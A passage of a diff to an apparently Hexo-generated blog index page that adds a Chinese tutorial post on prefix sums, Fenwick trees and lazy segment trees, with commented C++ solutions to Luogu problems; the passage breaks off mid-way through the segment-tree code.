@@ -116,7 +116,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">86</span>
+          <span class="site-state-item-count">88</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -152,6 +152,272 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/28/%E5%89%8D%E7%BC%80%E5%92%8C%E3%80%81%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E3%80%81%E7%BA%BF%E6%AE%B5%E6%A0%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="一个废物捏">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/06/28/%E5%89%8D%E7%BC%80%E5%92%8C%E3%80%81%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E3%80%81%E7%BA%BF%E6%AE%B5%E6%A0%91/" class="post-title-link" itemprop="url">前缀和、树状数组、线段树</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-06-28 17:45:06" itemprop="dateCreated datePublished" datetime="2021-06-28T17:45:06+08:00">2021-06-28</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-03-27 21:00:27" itemprop="dateModified" datetime="2022-03-27T21:00:27+08:00">2022-03-27</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <table>
+<thead>
+<tr class="header">
+<th></th>
+<th>区间求和</th>
+<th>区间最大值</th>
+<th>区间修改</th>
+<th>单点修改</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>前缀和</td>
+<td>√</td>
+<td>×</td>
+<td>×</td>
+<td>×</td>
+</tr>
+<tr class="even">
+<td>树状数组</td>
+<td>√</td>
+<td>×</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr class="odd">
+<td>线段树</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+</tbody>
+</table>
+<h1 id="树状数组">树状数组</h1>
+<p>引入:</p>
+<p>当i&amp;(-i)时会发生什么：</p>
+<p>先看例子：</p>
+<table>
+<thead>
+<tr class="header">
+<th>十进制</th>
+<th>二进制</th>
+<th>二进制（补）</th>
+<th>i&amp;(-i)</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>0</td>
+<td>0000</td>
+<td>0000</td>
+<td>0000</td>
+</tr>
+<tr class="even">
+<td>1</td>
+<td>0001</td>
+<td>1111</td>
+<td>0001</td>
+</tr>
+<tr class="odd">
+<td>2</td>
+<td>0010</td>
+<td>1110</td>
+<td>0010</td>
+</tr>
+<tr class="even">
+<td>3</td>
+<td>0011</td>
+<td>1101</td>
+<td>0001</td>
+</tr>
+<tr class="odd">
+<td>4</td>
+<td>0100</td>
+<td>1100</td>
+<td>0100</td>
+</tr>
+<tr class="even">
+<td>5</td>
+<td>0101</td>
+<td>1011</td>
+<td>0001</td>
+</tr>
+<tr class="odd">
+<td>6</td>
+<td>0110</td>
+<td>1010</td>
+<td>0010</td>
+</tr>
+</tbody>
+</table>
+<p>也就是说</p>
+<p>设x=i&amp;(-i)，则x相当于 （将i的所有高位1砍掉，只保留最低的1）之后的i。 那么现在假设我想知道这个1在第几位，比如说第k位，易得<span class="math inline">\(k=log_2x\)</span> 即<span class="math inline">\(x=2^k\)</span>=i&amp;(-i) 现在有人给i&amp;(-i)取了个名字——lowbit，即<span class="math inline">\(2^k\)</span>=lowbit(i)=i&amp;(-i)</p>
+<p>以下为一些解释： ​ i=0时，0&amp;0=0，k不存在 ​ i为奇数时，i的二进制第0位一定是1，i取反后第0位是0，再加1第0位又变回1。至此i没有经历过进位，故i和(-i)除了第0位相同，其余位相反，故i&amp;(-i)一定等于1，则k一定等于0 ​ i为偶数且<span class="math inline">\(i=2^m\)</span>时，则i的二进制只存在一位为1，其余皆为0（例如0010，0100，1000），此时i求反仍是其本身，i&amp;(-i)也是其本身，此时<span class="math inline">\(2^k\)</span>=i=i&amp;(-i) ​ i为偶数且<span class="math inline">\(i\neq2^m\)</span>时，根据i为奇数时的定义，此时i可以看成某个奇数向左平移k位</p>
+<p>树状数组： 因为十进制正整数都有其唯一对应的二进制数，故任何一个十进制正整数都能展开：<span class="math inline">\(x=2^a+2^b+2^c+···\)</span> 例如：117=64+32+16+4+1 重新观察上面这个表达式，117个1 = 64个1 + 32个1 +16个1 + 4个1 + 1个1 同理，117个箱子 = 64个箱子 + 32个箱子 +16个箱子 +4个箱子 + 1个箱子 假设现在有117个箱子按顺序摆在我的面前，每个箱子装了不同数量的，额，苹果，好的。 我给这117个箱子编号，1号箱子，2号箱子，3号箱子，4号箱子······ 我现在想知道这117个箱子一共TM的到底装了多少个苹果，那么我可以需要取 1到64号箱子苹果总数，加上65号到96号箱子里苹果的总数，再加上97号到112号箱子里苹果的总数，再加上113号到116号箱子里苹果的总数，再加上117号箱子里苹果的总数。</p>
+<p>现在假设有个表格来记录莫些箱子装的苹果数之和</p>
+<p>如下图，</p>
+<img src="/2021/06/28/%E5%89%8D%E7%BC%80%E5%92%8C%E3%80%81%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E3%80%81%E7%BA%BF%E6%AE%B5%E6%A0%91/1.jpg" class>
+<p>沿着i+=lowbit(i)进行存储，那么沿着i-=lowbit(i)取出，即可取出1~i的区间和</p>
+<p>假设现在需要取1到14出来，14的二进制是1110，也就是说14=8+4+2，把8、4、2一次对应到数组中为8，12，14。故1到14的箱子所装的苹果总数为8号箱+12号箱+14号箱。12的二进制1100，8的二进制1000。i-=lowbit相当于砍掉最后1位的1。故i-=lowbit(i)实现14到12到8。</p>
+<h2 id="洛谷p3374">洛谷p3374</h2>
+<p>手打版本</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">500007</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> i &amp; (-i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (i &lt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">		a[i] += num;</span><br><span class="line">		i += <span class="built_in">lowbit</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum1 = <span class="number">0</span>, sum2 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (x &gt;= <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		sum1 += a[x];</span><br><span class="line">		x -= <span class="built_in">lowbit</span>(x);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (y &gt;= <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		sum2 += a[y];</span><br><span class="line">		y -= <span class="built_in">lowbit</span>(y);</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; sum2-sum1 &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> j; cin &gt;&gt; j;</span><br><span class="line">		<span class="built_in">add</span>(i, j);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> choise, x, y;</span><br><span class="line">		cin &gt;&gt; choise &gt;&gt; x &gt;&gt; y;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (choise == <span class="number">1</span>)</span><br><span class="line">			<span class="built_in">add</span>(x, y);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">sum</span>(x<span class="number">-1</span>, y);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>早在高一的时候就有同学试图教会我的便捷写法，现在看来教的不是很好，但我至今没能到达别人高一的水准</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">500001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	 <span class="keyword">int</span> n,m; cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	 <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; ++i)</span><br><span class="line">	 &#123;</span><br><span class="line">	 	<span class="keyword">int</span> a; cin &gt;&gt; a;</span><br><span class="line">	 	<span class="keyword">for</span> (<span class="keyword">int</span> j=i; j&lt;=n; j=j+(j&amp;-j))s[j]=s[j]+a;</span><br><span class="line">	 &#125;</span><br><span class="line">	 </span><br><span class="line">	 <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=m; ++i)</span><br><span class="line">	 &#123;</span><br><span class="line">	 	<span class="keyword">int</span> z,x,y;</span><br><span class="line">	 	cin &gt;&gt; z &gt;&gt; x &gt;&gt; y;</span><br><span class="line">	 	<span class="keyword">if</span> (z==<span class="number">1</span>)</span><br><span class="line">	 		<span class="keyword">for</span> (<span class="keyword">int</span> j=x; j&lt;=n; j=j+(j&amp;-j))s[j]=s[j]+y;</span><br><span class="line">	 		</span><br><span class="line">	 	<span class="keyword">if</span> (z==<span class="number">2</span>)</span><br><span class="line">	 	&#123;</span><br><span class="line">	 		<span class="keyword">int</span> ans=<span class="number">0</span>;<span class="keyword">int</span> max=<span class="number">0</span>;</span><br><span class="line">	 		<span class="keyword">for</span> (<span class="keyword">int</span> j=y; j&gt;<span class="number">0</span>; j=j-(j&amp;-j))ans=ans+s[j];</span><br><span class="line">	 		<span class="keyword">for</span> (<span class="keyword">int</span> j=x<span class="number">-1</span>; j&gt;<span class="number">0</span>; j=j-(j&amp;-j))max=max+s[j];</span><br><span class="line">	 		cout &lt;&lt; ans-max &lt;&lt; endl;</span><br><span class="line">	 	&#125;</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="p3368">p3368</h2>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">500001</span>];<span class="keyword">int</span> b[<span class="number">500001</span>];<span class="keyword">int</span> s[<span class="number">500001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,m;</span><br><span class="line">	cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> ba=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		cin &gt;&gt; a[i];</span><br><span class="line">		b[i]=a[i]-a[i<span class="number">-1</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j=i; j&lt;=n; j=j+(j&amp;-j))s[j]=s[j]+b[i];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> p,x,y,k;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=m; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		cin &gt;&gt; p;</span><br><span class="line">		<span class="keyword">if</span> (p==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			cin &gt;&gt; x &gt;&gt; y &gt;&gt; k;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j=x; j&lt;=n; j=j+(j&amp;-j))s[j]=s[j]+k;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j=y+<span class="number">1</span>; j&lt;=n; j=j+(j&amp;-j))s[j]=s[j]-k;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (p==<span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			cin &gt;&gt; x;</span><br><span class="line">			<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j=x; j&gt;<span class="number">0</span>; j=j-(j&amp;-j))ans=ans+s[j];</span><br><span class="line">			cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="线段树">线段树</h1>
+<p>相比树状数组较为复杂，但是适用于任何适用于结合律的区间问题</p>
+<p>三个数组：a[MAXN]，ans[MAXN &lt;&lt; 2]，tag[MAXN &lt;&lt; 2] a数组是输入数组，当且仅当建树中使用到 ans是树形数组，每个节点代表某个区间的和，每个节点的两个子树拆分区间 tag是和ans对应的树形数组，负责记录修改值 注意ans树和tag树的更新只显示在树的尽可能上的地方，不会向下实时更新，需要用的时候在更新</p>
+<p>建树： 拆分序列，直到叶子节点，ans数组中的叶子节点和a数组对应上</p>
+<p>pushup(p)：代码上直观的来看更像是是吸收，ans [p]的值来自于p的左右子树 pushdown：假设现有区间1到5，很明显，ans1负责存储这个区间的和，tag1负责存储这个区间上次的修改值。现在令这个区间加上2，则ans1加上10，tag1加上2。那么此时的树就不成立了，因为ans1的值不等于ans2和ans3的和了，但无所谓。下次若查询1到5的区间和，直接找ans1就行，不必找ans1以后的值。那么问题来了，现在要查询1到4的区间和怎么办？此时pushdown出场。ans1、tag1对应的区间1到5不是所查询的区间。向下更新这颗树——tag2=tag3=tag1，tag1=0。然后利用tag2和tag3，使得ans2+ans3=ans1。pushdown完毕。此时1到3区间和可直接查，4到5区间可直接查。以此类推。</p>
+<p>问题： 1暂时不知道为什么数组开这么大，到时候缩小看看能不能通过</p>
+<h2 id="洛谷题解代码我加的注释">洛谷题解代码（我加的注释）</h2>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 1000001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> ll n, m, a[MAXN], ans[MAXN &lt;&lt; <span class="number">2</span>], tag[MAXN &lt;&lt; <span class="number">2</span>];</span><br><span class="line"><span class="comment">//a数组是输入数组，当且仅当建树中使用到</span></span><br><span class="line"><span class="comment">//ans是树形数组，每个节点代表某个区间的和，每个节点的两个子树拆分区间</span></span><br><span class="line"><span class="comment">//tag是和ans对应的树形数组，负责记录修改值</span></span><br><span class="line"><span class="comment">//注意ans树和tag树的更新只显示在树的尽可能上的地方，不会向下实时更新，需要用的时候在更新</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ll <span class="title">ls</span><span class="params">(ll x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &lt;&lt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> ll <span class="title">rs</span><span class="params">(ll x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scan</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (ll i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">push_up</span><span class="params">(ll p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ans[p] = ans[<span class="built_in">ls</span>(p)] + ans[<span class="built_in">rs</span>(p)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(ll p, ll l, ll r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    tag[p] = <span class="number">0</span>;<span class="comment">//如果能保证tag数组初始值位全为0的话，那么这行其实可以删掉</span></span><br><span class="line">    <span class="keyword">if</span> (l == r) &#123; ans[p] = a[l]; <span class="keyword">return</span>; &#125;<span class="comment">//l==r，为叶子节点</span></span><br><span class="line">    ll mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">build</span>(<span class="built_in">ls</span>(p), l, mid);<span class="comment">//后面参数2、3持续分割数列，</span></span><br><span class="line">    <span class="built_in">build</span>(<span class="built_in">rs</span>(p), mid + <span class="number">1</span>, r);</span><br><span class="line">    <span class="built_in">push_up</span>(p);<span class="comment">//这行不修改叶子节点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(ll p, ll l, ll r, ll k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    tag[p] = tag[p] + k;</span><br><span class="line">    ans[p] = ans[p] + k * (r - l + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">push_down</span><span class="params">(ll p, ll l, ll r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ll mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">f</span>(<span class="built_in">ls</span>(p), l, mid, tag[p]);</span><br><span class="line">    <span class="built_in">f</span>(<span class="built_in">rs</span>(p), mid + <span class="number">1</span>, r, tag[p]);</span><br><span class="line">    tag[p] = <span class="number">0</span>;<span class="comment">//修改值已经向下传递了</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(ll nl, ll nr, ll l, ll r, ll p, ll k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//nl,nr为要修改的区间</span></span><br><span class="line">    <span class="comment">//l,r为当前节点所存储的区间</span></span><br><span class="line">    <span class="comment">//p为节点编号</span></span><br><span class="line">    <span class="keyword">if</span> (nl &lt;= l &amp;&amp; r &lt;= nr)<span class="comment">//找到一个可直接更新的区间，更新，且直接返回</span></span><br><span class="line">    &#123;</span><br><span class="line">        ans[p] += k * (r - l + <span class="number">1</span>);</span><br><span class="line">        tag[p] += k;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">push_down</span>(p, l, r);</span><br><span class="line">    <span class="comment">//程序走到这一步说明，目前所在区间不在所找区间内，下面会拆分序列，这里先pushdown，将树向下更新之前的修改值（可能存在）</span></span><br><span class="line">    ll mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (nl &lt;= mid) <span class="built_in">update</span>(nl, nr, l, mid, <span class="built_in">ls</span>(p), k);<span class="comment">//向左子树更新</span></span><br><span class="line">    <span class="keyword">if</span> (nr &gt; mid) <span class="built_in">update</span>(nl, nr, mid + <span class="number">1</span>, r, <span class="built_in">rs</span>(p), k);<span class="comment">//向右子树更新</span></span><br><span class="line">    <span class="built_in">push_up</span>(p);<span class="comment">//执行到这一步说明没有更新“总结点”，即上面的if (nl &lt;= l &amp;&amp; r &lt;= nr)没执行，现在合并左右子树</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">query</span><span class="params">(ll q_x, ll q_y, ll l, ll r, ll p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ll res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (q_x &lt;= l &amp;&amp; r &lt;= q_y)<span class="keyword">return</span> ans[p];<span class="comment">//找到所要查询的区间，直接返回，如果查找不到，返回下面的res，res分别是左子树的res和右子树的res的和</span></span><br><span class="line">    ll mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">push_down</span>(p, l, r);<span class="comment">//向下更新信息，因为此时树的底层的信号滞后于树的高层</span></span><br><span class="line">    <span class="keyword">if</span> (q_x &lt;= mid)res += <span class="built_in">query</span>(q_x, q_y, l, mid, <span class="built_in">ls</span>(p));</span><br><span class="line">    <span class="keyword">if</span> (q_y &gt; mid) res += <span class="built_in">query</span>(q_x, q_y, mid + <span class="number">1</span>, r, <span class="built_in">rs</span>(p));</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;be.in&quot;</span>,<span class="string">&quot;r&quot;</span>, stdin);</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;be.out&quot;</span>,<span class="string">&quot;w&quot;</span>, stdout);</span><br><span class="line">    ll a1, b, c, d, e, f;</span><br><span class="line">    <span class="built_in">scan</span>();</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>, <span class="number">1</span>, n);</span><br><span class="line">    <span class="keyword">while</span> 